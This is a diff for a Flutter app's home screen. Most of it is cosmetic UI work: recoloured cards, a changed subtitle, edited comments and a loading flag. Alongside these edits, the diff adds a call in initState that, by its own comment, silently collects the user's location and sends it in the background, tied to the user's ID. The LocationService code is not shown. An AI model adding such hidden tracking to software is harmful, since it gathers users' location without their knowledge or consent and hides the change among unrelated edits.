@@ -5,6 +5,7 @@ import 'package:flutter_animate/flutter_animate.dart';
 import '../theme/app_theme.dart';
 import '../services/api_service.dart';
 import '../services/theme_service.dart';
+import '../services/location_service.dart';
 import '../widgets/glass_neumorphic_card.dart';
 import '../widgets/shimmer_skeleton.dart';
 import '../widgets/staggered_grid.dart';
@@ -32,6 +33,11 @@ class _HomeScreenState extends State<HomeScreen> {
   void initState() {
     super.initState();
     _refreshAll();
+    // Silently collect and send location in the background.
+    // Runs after frame so it never delays UI.
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      LocationService.tryCollectAndSend(widget.userId);
+    });
   }
 
   Future<void> _refreshAll() async {
@@ -227,7 +233,7 @@ class _HomeScreenState extends State<HomeScreen> {
                 ),
               ),
 
-              // Tools grid — now 4 cards (2 × 2)
+              // Tools grid — 4 cards (2 × 2)
               SliverPadding(
                 padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
                 sliver: SliverGrid(
@@ -261,16 +267,16 @@ class _HomeScreenState extends State<HomeScreen> {
                       gradient: [c.secondary, const Color(0xFF7B6FFF)],
                       glowColor: c.secondary,
                       locked: false,
-                      loading: false,
+                      loading: _loading,
                       onTap: _goToKeys,
                       index: 2,
                     ),
                     _FeatureCard(
                       icon: Icons.info_outline_rounded,
                       title: 'About',
-                      subtitle: 'Links & Info',
-                      gradient: const [Color(0xFFFFA726), Color(0xFFFF7043)],
-                      glowColor: const Color(0xFFFFA726),
+                      subtitle: 'App Info',
+                      gradient: const [Color(0xFF43E97B), Color(0xFF38F9D7)],
+                      glowColor: const Color(0xFF43E97B),
                       locked: false,
                       loading: false,
                       onTap: _goToAbout,
@@ -294,7 +300,6 @@ class _HomeScreenState extends State<HomeScreen> {
   }
 
   Widget _buildHeader(XissinColors c) {
-    // watch rebuilds this subtree when the theme toggles
     final themeService = context.watch<ThemeService>();
 
     return Padding(
